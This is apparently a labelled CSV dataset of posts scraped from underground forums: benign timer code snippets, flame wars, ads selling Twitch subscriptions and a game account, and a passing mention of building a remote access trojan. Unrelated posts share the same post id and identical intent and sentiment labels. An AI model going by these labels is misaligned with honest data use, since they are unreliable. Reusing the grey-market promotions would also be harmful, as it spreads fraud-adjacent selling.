postid,intent,sentiment,content
5064170,neutral,0.0454545454545455,"***CITING***[https://hackforums.net/showthread.php?pid=5064131#pid5064131]***CITING***
You're entitled to your opinion but I'd suggest before you degrade others, suggest something better.

What? Okay..."
5064170,neutral,0.0454545454545455,"***CITING***[showthread.php?p=5057919#post5057919]***CITING***

So newbies need a chance to get better ***IMG***[images/emotions/cry.gif]***IMG***"
5064170,neutral,0.0454545454545455,did you guys even read OP's message.. he has an account with a limit of 900usd but wants to sell items ranging from 29k to 100K..so opening several account is pointless. best bet is to call eBay and discuss your business plan directly with them. make sure you speak to a manager and explain everything in detail. good luck
5064170,neutral,0.0454545454545455,+
5064170,neutral,0.0454545454545455,"***CITING***[https://ogusers.com/Thread-xxxtentacion-psn?pid=5043225#pid5043225]***CITING***
Forza already owned it"
5064170,neutral,0.0454545454545455,"Hey guys, I've been dating this boy for a month and I'm beginning to feel like he is losing feelings for me. I've haven't been feeling the same since he called me a pussy and a bastard for something I couldn't control. Should I keep him or leave him? I' love him. But he asked if we could 'do it'. Anyone able to help me?
	
	
	
	
		
	

		
		  ***LINK***[#likepid5064170]***LINK***
		  0 
		
		
		  ***LINK***[#dislikepid5064170]***LINK***
		   0 
		
		
		***LINK***[/viewratings.php?pid=5064170]***LINK***"
5064170,neutral,0.0454545454545455,thanks
5073564,neutral,0,make sure your label value / text = 0 or a number & not with any letters / symbols
5073564,neutral,0,"Online and available for orders / deliveries!







***LINK***[CHEAPEST] Twitch Prime Subs! [CLICK][https://ogusers.com/Thread-TWITCH-TOTAL-PRICE-MATCH-Subs-Followers-Views-Affiliates-More]***LINK***
PRICE MATCH AND BEAT GUARANTEE!!!
DISCORD -> Ha#0001
TELEGRAM -> ***LINK***ioGvr[https://t.me/ioGvr]***LINK***
***LINK***Click HERE for my Selly Shop and Autobuy![https://selly.gg/@mcWin]***LINK***





***LINK***[CHEAPEST] Twitch Prime Subs! [CLICK][https://ogusers.com/Thread-TWITCH-TOTAL-PRICE-MATCH-Subs-Followers-Views-Affiliates-More]***LINK***
PRICE MATCH AND BEAT GUARANTEE!!!
DISCORD -> Ha#0001
TELEGRAM -> ***LINK***ioGvr[https://t.me/ioGvr]***LINK***
***LINK***Click HERE for my Selly Shop and Autobuy![https://selly.gg/@mcWin]***LINK***









***LINK***[CHEAPEST] Twitch Prime Subs! [CLICK][https://ogusers.com/Thread-TWITCH-TOTAL-PRICE-MATCH-Subs-Followers-Views-Affiliates-More]***LINK***
PRICE MATCH AND BEAT GUARANTEE!!!
DISCORD -> Ha#0001
TELEGRAM -> ***LINK***ioGvr[https://t.me/ioGvr]***LINK***
***LINK***Click HERE for my Selly Shop and Autobuy![https://selly.gg/@mcWin]***LINK***





***LINK***[CHEAPEST] Twitch Prime Subs! [CLICK][https://ogusers.com/Thread-TWITCH-TOTAL-PRICE-MATCH-Subs-Followers-Views-Affiliates-More]***LINK***
PRICE MATCH AND BEAT GUARANTEE!!!
DISCORD -> Ha#0001
TELEGRAM -> ***LINK***ioGvr[https://t.me/ioGvr]***LINK***
***LINK***Click HERE for my Selly Shop and Autobuy![https://selly.gg/@mcWin]***LINK***"
5073564,neutral,0,"***CITING***[https://v3rmillion.net/showthread.php?pid=5073562#pid5073562]***CITING***
whats the discord tag.
you're clearly lying bud
	
	
	
	
		
	

		
		  ***LINK***[#likepid5073564]***LINK***
		  0 
		
		
		  ***LINK***[#dislikepid5073564]***LINK***
		   0 
		
		
		***LINK***[/viewratings.php?pid=5073564]***LINK***"
5073274,neutral,0,"Code:***CODE***[for (int i = 5; i > 0; i--)
{
Label1.Text = i.ToString()
System.Threading.Thread.Sleep(1000)
}]***CODE***"
5073274,neutral,0,Wo wo did you get this idea from my mudkip mtar 21 cuz pokemon are my thing !
5073274,neutral,0,"Продам аккаунт robocraft за 300 рублей. Там премиум навсегда , много легендарок. Не обману , всё честно!!! За покупкой писать в вк- Please login or register to view links , или skype- lexa200353.
Аккаунт идёт со стоимом!"
5073274,neutral,0,"т008сс сказал(а) 26 Сен 2015 - 12:54:***LINK***[https://zismo.biz/index.php?app=forums&module=forums&section=findpost&pid=5073259]***LINK******QUOTE***

не проще было молча мимо пройти?

***QUOTE***
а я тебе ответ дал?? хотел услышать услышал!! К чему бредо темы разводить?"
5072350,neutral,0.0210526315789474,"I made this for a disclaimer for a rat I'm working on. So you can just get the concept of it. Also you'll need to declare CountdownVar earlier in your code..

Code:***CODE***[Private Sub Countdown_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Countdown.Tick
  CountdownVar = CountdownVar - 1
  Select CountdownVar
    Case Is <= 0
    Countdown.Enabled = False
    OK_Button.Enabled = True
    Me.Text = ""Disclaimer""
    Case Else
    Me.Text = ""Disclaimer "" + Replace(""("" + Str(CountdownVar) + "")"", "" "", """")
  End Select
    End Sub]***CODE***"
5072350,neutral,0.0210526315789474,There have been reports of BlamAds too - becareful
5072350,neutral,0.0210526315789474,marry me ace
5072350,neutral,0.0210526315789474,QA85-AMGC-GE7K-4QMS-FPZ5-L25X-DV5K-LRAX
5071949,positive,0.0979020979020979,"Wow, seems you really have it out for me. Does appearing as if you're correcting me make you feel better about yourself? Obviously it does, otherwise you'd leave it be. I've already admitted I was wrong about the threading/timers in this case, not sure why it's being brought back up other than to start a flame war or get attention from your online peers.

As to your code, both work to some extent, though mine is better IMHO because it's sexier, not a big deal.

Also, ""people"" don't ridicule me, it seems you're the only one here who stalks my posts to make sure they're 100% correct haha, I still love you for it <3 It's glad to know I got a fan who's always watching my back and correcting me when I make a mistake ***IMG***[https://hackforums.net/images/smilies/cool.gif]***IMG***"
5071949,positive,0.0979020979020979,"***CITING***[showthread.php?p=5071881#post5071881]***CITING***

@***LINK***ChimiBang[https://www.mpgh.net/forum/member.php?u=458335]***LINK***

When are you going to remove me from your sig when we cleared it out?"
5071949,positive,0.0979020979020979,I think also rar.
5071949,positive,0.0979020979020979,"Нормальный хайд, с группой."
5071949,positive,0.0979020979020979,get some cool emails family thanks
5071194,neutral,-0.0169491525423729,"@ OP

My (noob) suggestion, if you want to use a timer , would be :

- Make sure you set your timer interval to 1000

-Timer:
Code:***CODE***[If Label1.Text = 0 Then
  Else
    Label1.Text = Val(Label1.Text) - Val(""1"")
  End If]***CODE***
Should do the trick. ***IMG***[https://hackforums.net/images/smilies/blackhat.gif]***IMG***"
5071194,neutral,-0.0169491525423729,Bumping this kawns
5071194,neutral,-0.0169491525423729,"***CITING***[https://v3rmillion.net/showthread.php?pid=5071141#pid5071141]***CITING***
[/quote]

1. The products are made not much different and cost pretty much equal to manufacture, but women’s accessories just cost more. That is my point. 

2. The whole point of my second statement was focused on political representation. That was his reply, so that’s what I assumed. Yes, there are jobs dominated by one gender. I wasn’t clearly referring to positions of power which should not be exclusive. You agree that females are equally capable. That was my entire point. 

3. I agree, there are male stereotypes, but there is still plenty of social stigma against females. Many women may lie, but it’s clear that the overwhelming majority of cases is women.
	
	
	

novum folium.
1000+ vouches.





	
		
	

		
		  ***LINK***[#likepid5071194]***LINK***
		  0 
		
		
		  ***LINK***[#dislikepid5071194]***LINK***
		   0 
		
		
		***LINK***[/viewratings.php?pid=5071194]***LINK***"
5071194,neutral,-0.0169491525423729,Если не трудно мне в личку можно
5070865,gratitude,0.0952380952380952,"***CITING***[https://hackforums.net/showthread.php?pid=5070745#pid5070745]***CITING***
Ah okay, thanks :) As I said, I've only used VB once, so I won't ever be 100% in VB xD Thanks for clearing that up though ***IMG***[https://hackforums.net/images/smilies/biggrin.gif]***IMG***

I'll make sure to edit my 1st reply now."
5070865,gratitude,0.0952380952380952,"after many fails, I got approved, now what can I do to start making money, is any one interrested ? nooob to CPA here, go easy with me please"
5070865,gratitude,0.0952380952380952,"***CITING***[https://ogusers.com/Thread-STAFF-VOUCHED-TRUSTED-DEV-Death%E2%80%99s-Auto-Bumper-Big-sale?pid=5070856#pid5070856]***CITING***
that's strange, i'll set the timer to 1 hour and 5 mins to see if it still does that

Using this now







Always confirm on site.

***IMG***[https://i.gyazo.com/89d82261903b8427f0184c9c93ec72d4.png]***IMG***

no longer death#6666 on discord.





Always confirm on site.

***IMG***[https://i.gyazo.com/89d82261903b8427f0184c9c93ec72d4.png]***IMG***

no longer death#6666 on discord.









Always confirm on site.

***IMG***[https://i.gyazo.com/89d82261903b8427f0184c9c93ec72d4.png]***IMG***

no longer death#6666 on discord.





Always confirm on site.

***IMG***[https://i.gyazo.com/89d82261903b8427f0184c9c93ec72d4.png]***IMG***

no longer death#6666 on discord."
5070745,neutral,0.0303030303030303,"Using a new thread for such a thing is obviously pointless, however, Zer0 & Aeon are right, I hope someone cleans up this thread for future people looking for a reference.

@CometJack
Code:***CODE***[For Integer i = Val(label3.Text) To 0]***CODE***
needs to be
Code:***CODE***[For I As Integer = Val(Label3.Text) To 0]***CODE***
the C# got to you on declaring vars backwards,"
5070745,neutral,0.0303030303030303,The first 151 pokemons ***IMG***[images/emotions/=_=.png]***IMG***
5070745,neutral,0.0303030303030303,"***CITING***[goto/post?id=5070596#post-5070596]***CITING***​

I do the same with my PP account. Works just fine. It's a debit card, right?

Good luck with your journey!! ***IMG***[styles/default/xenforo/clear.png]***IMG***"
